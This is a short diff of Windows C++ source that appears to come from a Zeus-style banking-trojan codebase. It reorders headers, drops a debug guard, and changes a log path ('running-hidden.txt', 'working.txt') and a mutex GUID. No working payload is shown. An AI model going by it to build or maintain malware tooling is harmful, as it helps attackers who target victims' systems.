@@ -4,10 +4,8 @@
 #include<ShlObj.h>
 #include<Shlwapi.h>
 #include"defines.h"
-#include"defines.h"
 
-#include"relocTable.h"
-
+#include "config.h"
 #include "debug.h"
 #include "generateddata.h"
 #include "core.h"
@@ -19,17 +17,12 @@
 #include "winsecurity.h"
 #include "fs.h"
 #include "wsocket.h"
-//#include "mscab.h"
 #include "sync.h"
-//#include "disasm.h"
-//#include "comlibrary.h"
-//#include "xmlparser.h"
-//#include "wahook.h"
 #include "registry.h"
 #include "winsecurity.h"
 #include "WinAPITypes.h"
 
-
+COREDATA coreData;
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 // Process list.
@@ -800,20 +793,16 @@ bool Core::showInfoBox(BYTE type)
   return true;
 }
 
-#define BO_DEBUG 1
-
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 // entry point.
 ////////////////////////////////////////////////////////////////////////////////////////////////////
-#if(BO_DEBUG == 1)
 static SECURITY_ATTRIBUTES saFullAccess;
 static SECURITY_DESCRIPTOR sdFullAccess;
 static bool SecurityOK;
 static WCHAR __strDebugReportFile[MAX_PATH];
 static DWORD integrityLevel;
-#define LOG_FILE_W        L"working.txt"
-#define MUTEX_WRITEFILE L"{7EEEA37C-5CEF-11DD-9810-2A4256D89593}"
-#endif
+#define LOG_FILE_W        L"C:\\working.txt"
+#define MUTEX_WRITEFILE L"{7EEEA37C-5CEF-11DD-9810-2F4256D89596}"
 
 static bool defaultModuleEntry(void)
 {
@@ -822,7 +811,7 @@ static bool defaultModuleEntry(void)
 	integrityLevel = Process::_getIntegrityLevel(CURRENT_PROCESS);
 	if(integrityLevel == Process::INTEGRITY_UNKNOWN || integrityLevel == Process::INTEGRITY_HIGH)
 	{
-		Str::_CopyW(__strDebugReportFile, L"C:\\running-hidden.txt", -1);
+		Str::_CopyW(__strDebugReportFile, LOG_FILE_W, -1);
 	}
 	else
 	{
